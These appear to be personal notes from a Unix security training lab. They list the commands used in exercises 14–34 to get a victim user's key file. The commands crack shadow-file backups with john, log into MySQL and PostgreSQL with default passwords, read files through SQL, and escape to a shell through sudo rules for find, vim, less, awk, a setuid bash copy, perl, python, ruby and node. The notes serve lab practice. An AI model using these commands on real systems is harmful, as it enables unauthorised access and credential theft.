Unix batch:
	cd
	ls
	file [filename]
	gunzip





Unix 14:
	- cd /tmp/
	- ls -lah
	- cd /var/tmp/
	- ls
	- file backup (gzip compressed data)
	- gunzip backup (error message due to suffix)
	- ls -ltrh
	- cp backup test.gz
	- gunzip test.gz
	- ls -ltrh
	- file test
	- tar xvf test
	- cat home/victim/credentials.txt
	  (got password)
	- su victim
	- cd ~
	- ls
	- cat key.txt

Unix 15:
	- cd /etc
	- ls
	- ls -ltrh /etc/shadow*
	- cat /etc/shadow.backup
	- john john.txt
	  (got password)
	- su - victim
		pass:victim11
	- ls
	- cat key.txt

Unix 16:
	- cd /etc
	- ls -ltr
	- cat shadow.backup
	- john john.txt
	  (got password)
	- su - victim
		pass:victim1
	- ls
	- cat key.txt
	
Unix 17:
	- cat /etc/passwd
	- cd /usr/share/tomcat
	- ls
	- cat /etc/debian_version
	- cd /etc
	- cd tomcat7
	- ls -ltrh
	- cat tomcat-users.xml

Unix 18:
	- ps -edf
	- mysql -u root
	- show databases;
	- use pentesterlab
	- show tables;
	- select * from users;

Unix 19:
	- ps -edf
	- mysql -u root
	- mysql -u root -p
	  (enter pass:root)  
	- mysql -u root -p
	  (enter pass:toor)
	- Ctrl+D (Bye)
	- mysql -u root -ptoor
	- show databases;
	- use data
	- show tables;
	- select * from logins;

Unix 20:
	- su mysql
	  (pass:mysql)
	- cd /var/lib/mysql/mysql
	- ls -ltrh
	- strings user.MYD
	- john john.txt
	  (got pass)
	- mysql -u root -p
	  (pass:root3)
	-show databases;
	- use pentesterlab
	- show tables;
	- slect * from users;
	
Unix 21:
	- mysql -u root
	- select load_file('/var/lib/mysql-files/key.txt');
	
Unix 22:
	- ps -edf
	- su - postgres
	  (pass:postgres)
	- psql
	- \list
	- \c pentesterlab
	- \d
	- select * from users;

Unix 23:
	- ps -edf
	- cd /var/www
	- find
	- cat classes/db.php
	- psql photoblog -U photoblog -W
	  (pass:photoblog)
	- CREAT TABLE demo(t text);
	- COPY demo from '/var/lib/postgresql/9.4/key.txt';
	- select * from demo;
	
Unix 24:
	- cd /tmp/
	- ls
	- file database.db
	- sqlite3 database.db
	- .tables
	- select * from users;

Unix 25:
	- sudo -l
	- sudo bash
	- sudo -u victim bash
	- cd
	- ls
	- cat key.txt

Unix 26:
	- sudo -l
	- sudo -u victim find /home/victim
	- sudo -u victim find /home/victim -name key.txt
	- sudo -u victim find /home/victim -name key.txt -exec cat {} \;
	
	- sudo -u victim /home/victim -name key.txt -exec bash \;
	- cd
	- cat key.txt

Unix 27:
	- sudo -l
	- sudo -u victim vim /home/victim/key.txt

Unix 28:
	- sudo -l
	- sudo -u victim less /home/victim/key.txt

Unix 29:
	- sudo -l
	- sudo -u victim awk '{print $1}' /home/victim/key.txt

Unix 30:
	- sudo -l
	- ls -l /usr/bin/passwd
	- sudo -u victim cp /bin/bash /tmp/foo
	- cd /tmp
	- ls -ltrh
	- sudo -u victim chmod +xs foo
	- ls -ltrh
	- ./foo
	- id
	- whoami
	- exit
	- vi bar.c
	- int main(void)
{
   system("cat /home/victim/key.txt");
}
	- Esc , : , wq
	- ls -l
	- gcc -o bar bar.c
	- ./bar
	- sudo -u victim cp bar /tmp/foo
	- sudo -u victim chmod +xs foo
	- ls -ltrh
	- ./foo

Unix 31:
	- sudo -l
	- sudo -u victim perl
	- sudo -u victim perl -e 'print `cat /home/victim/key.txt`'
		
Unix 32:
	- sudo -l
	- sudo -u victim python
	- 1+1
	- import os
	- os.system('uname')
	- os.system('cat /home/victim/key.txt')

Unix 33:
	- sudo -l
	- sudo -u victim ruby -e 'puts `id`'
	- sudo -u victim ruby -e 'puts `cat /home/victim/key.txt`'
	
Unix 34:
	- sudo -l 
	- sudo -u victim node -e 'var exec = require("child_process").exec;
	- exec("cat /home/victim/key.txt", function(error, stdOut, stdErr){
	- console.log(stdOut);
	- });'